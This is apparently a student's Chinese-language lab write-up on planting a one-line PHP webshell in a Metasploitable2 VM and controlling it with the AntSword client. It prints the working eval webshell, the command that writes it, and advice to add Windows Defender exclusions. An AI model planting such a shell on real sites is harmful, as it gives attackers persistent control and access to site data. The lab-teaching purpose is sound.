这学期 Web 安全课第 6 章「远程控制」有两个任务。任务一是用 Metasploit 做被控端连回攻击机（上一篇写过），任务二换了个思路：往网站里写一句话木马，再用中国蚁剑连上去，看看能不能只靠一个网页就把目标站点控制住。

整个实验都在我自己搭的虚拟机内网里完成，没有碰任何公网或别人的站点，文中涉及地址的地方都用占位符代替。下面按做实验的顺序记一遍，中间踩到的坑也一起写下来。

## 一、实验环境

| 角色 | 用的东西 | 说明 |
|---|---|---|
| 目标网站（靶机） | Metasploitable2（Ubuntu 8.04，Apache + PHP） | 网站根目录 `/var/www/`，自带 DVWA、phpMyAdmin 等 |
| 攻击端 | Windows 11 + 中国蚁剑 AntSword-Loader 4.0.3 | 连接 WebShell，提供文件管理和虚拟终端 |
| 网络 | VMware Host-only（VMnet1） | 两端互通，与公网隔离 |

课件要求的是往一个网站里写木马、再用蚁剑连上。我这边没准备单独的 Windows Web 靶机，就直接拿 Metasploitable2 自带的 Apache/PHP 网站当目标——它本身就是一套能正常访问的动态网站，PHP 木马写进去能被解析，和课件演示的机制是一样的。

## 二、先弄明白几个东西

- **一句话木马**：`<?php @eval($_POST["cmd"]);?>`，就一行。意思是把 POST 请求里 `cmd` 字段的内容当成 PHP 代码直接执行；前面那个 `@` 是让它别报错，免得暴露自己。
- **连接密码**：`cmd` 就是这个木马的口令。客户端得把要执行的代码放进这个字段，服务端才会去解析。
- **中国蚁剑**：它并不是真的"登录"进了服务器，而是把「列目录、传文件、执行命令」这些操作各写成一小段 PHP 代码，通过 POST 发给木马，再把返回的结果整理成图形界面给我看。
- **权限从哪来**：木马是跟着网站服务（Apache）一起跑的，所以拿到的是 `www-data` 这个身份，不是 root。不过读写网站目录、改页面、翻配置文件，已经够用了。
- **和任务一的区别**：任务一是让靶机主动连回攻击机，属于系统层面的控制；这次是一段网页脚本，得靠 Web 服务能解析 PHP，属于应用层面的控制。

## 三、实验步骤

### 3.1 确认目标网站能用

先把 Metasploitable2 开起来，浏览器访问 `http://<靶机IP>/`，能看到一个列着 DVWA、Mutillidae、phpMyAdmin、TWiki 的首页，就说明 Apache 和 PHP 都在正常工作。IP 是从靶机 `ifconfig` 里 `eth0` 那一行的 `inet addr` 看到的。

### 3.2 写一句话木马

在 Metasploitable2 的控制台执行（提示 sudo 密码时输靶机的默认口令）：

```bash
echo '<?php @eval($_POST["cmd"]);?>' | sudo tee /var/www/shell.php
```

终端把这行 `<?php ... ?>` 回显出来，就是写进去了。文件放在网站根目录，所以访问路径是 `/shell.php`。用浏览器直接打开会是一片空白——空白反而说明 PHP 已经把它解析了、正在等 POST 参数，不是失败。

![写入一句话木马的靶机终端：命令与 PHP 代码回显](/img/01_write_shell.png)

### 3.3 装中国蚁剑

蚁剑是「加载器 + 源码」分开的：先下载官方加载器 `AntSword-Loader v4.0.3 win32-x64`，解压后运行 `AntSword`，第一次启动点「初始化」选一个工作目录，加载器会自己去下源码。下完之后要**关掉重新打开**，才会进主界面。

这里有个地方要注意：蚁剑源码里自带各种 shell 模板，Windows Defender 扫到会直接报 `Backdoor:PHP/Remoteshell!rfn`。我先把安装目录加进了「病毒和威胁防护 → 排除项」，顺手把浏览器的下载位置也改到这个目录（不然文件先落到「下载」文件夹，不在排除范围里照样被拦）。临时关掉的防护，用完记得马上开回来。

![蚁剑主界面：数据管理列表为空，等待添加 WebShell](/img/02_antsword_main.png)

要是源码自动下载失败了（表现就是初始化完一直白屏或者转圈），可以去官方仓库手动下源码 ZIP，解压后把**文件夹里面的全部内容**复制进工作目录，让 `package.json`、`app.js` 直接待在目录根部，再点一次「初始化」选中这个目录就行。

### 3.4 添加数据（配置连接）

在主界面左边「数据管理」的空白处**右键 → 添加数据**，按下面填，其他保持默认：

| 字段 | 填写内容 |
|---|---|
| URL 地址 | `http://<靶机IP>/shell.php` |
| 连接密码 | `cmd` |
| 连接类型 | PHP（默认） |
| 编码 | UTF-8（默认） |
| 网站备注 | 自己随便写，比如「Metasploitable2 一句话木马」 |

可以先点「测试连接」，提示成功再点「添加」。要是连不上，先检查这几样：靶机开没开机、IP 是不是同网段、浏览器打开 `/shell.php` 是不是空白页、密码是不是严格等于 `cmd`。

### 3.5 连上之后：文件管理

双击刚加的那条记录，打开文件管理器。能看到网站根目录 `/var/www/` 下的全部内容，还有刚写进去的 `shell.php`（我这里 30 字节，时间是实验当天），就说明蚁剑已经能读、也能进一步写这个网站目录了。

![蚁剑文件管理器列出 /var/www/，可见新建的 shell.php](/img/03_file_manager.png)

### 3.6 虚拟终端：验证真的能执行命令

在记录上右键打开「虚拟终端」，敲：

```bash
cd /var/www/
whoami
```

返回 `www-data`，也就是网站服务进程的身份。文件管理证明「能读写」，虚拟终端证明「能执行系统命令」，两个合起来，才算完整说明网站被控制住了。

![蚁剑虚拟终端：whoami 返回 www-data](/img/04_virtual_terminal.png)

## 四、实验结果

| 验证项 | 结果 | 说明 |
|---|---|---|
| 木马可解析 | 访问 `/shell.php` 返回空白页 | PHP 已执行，等着收 POST 参数 |
| 连接建立 | 测试连接成功、记录能双击打开 | 蚁剑和木马通信正常 |
| 文件读取 | 列出 `/var/www/` 全部目录和文件 | 能读网站根目录 |
| 写入痕迹 | `shell.php` 在，30 b，时间是实验当天 | 和 3.2 写进去的一致 |
| 命令执行 | `whoami` → `www-data` | 继承 Apache 进程身份 |

`www-data` 虽然不是 root，但整个网站目录都能动，改首页、往页面里塞东西、翻数据库配置都够用了，所以一个 30 字节的小 PHP 文件就能让整个站点失陷。跟任务一那个 meterpreter 比，WebShell 不用开新端口、也不用反向连回来，靠一条看起来很正常的 HTTP POST 就能一直维持控制，在流量里反而更不容易被发现。

## 五、中间踩的坑

| 现象 | 原因 | 怎么解决 |
|---|---|---|
| `curl: no URL specified!` | 验证命令太长，在 80 列窄终端被折行，URL 从中间断开了 | 换个短命令，或者把窗口拉宽；这步本来就是可选的，蚁剑能连上就是最直接的证明 |
| 解压后找不到 `AntSword.exe` | Windows 默认隐藏已知扩展名，只显示成 `AntSword` | 直接双击那个「应用程序」就行，或者在「查看 → 显示」里勾上「文件扩展名」 |
| 源码 ZIP 被 Defender 拦 | 源码自带 PHP shell 模板，按内容被判成后门；而且下载先落到了没排除的目录 | 把安装目录加进排除项，并改掉浏览器下载位置；或者临时关实时保护，用完立刻恢复 |
| 初始化完窗口全白 | Electron 在下源码 / 切界面时渲染失败，或者下载中断了 | 手动把源码放进工作目录再重开；必要时用 `AntSword.exe --disable-gpu` 启动 |
| 重开还提示「请选择蚁剑工作目录」 | 上次初始化中断，路径没写进配置 | 再点一次「初始化」选中工作目录，检测到源码后就直接进主界面了 |
| 源码放了但加载器不认 | 把 `antSword-master` 整个文件夹塞进了工作目录，多套了一层 | 只复制文件夹**内部**的内容，保证 `package.json` 直接在目录根部 |

最后那条其实也挺有意思：Defender 把它报成 PHP 后门，反过来说明我下到的确实是正经的蚁剑源码（自带 shell 模板），不是坏包或者别人改过的包。

## 六、小结

这次把「写木马 → 蚁剑连上 → 看文件 → 执行命令」这一整条走通了，也算把课本上 WebShell 那几个字亲手做了一遍。和任务一那个二进制后门对着看，感觉还挺直观：远程控制不一定非得靠漏洞或者一个木马程序，一段被放进网站目录、能用 HTTP 正常访问的小脚本，一样能变成一条长期的控制通道。

所以防的时候，与其等出事了再查杀，不如先把「网站目录别随便可写、上传目录别能执行脚本、危险函数和异常 POST 能被发现」这几件事做好。
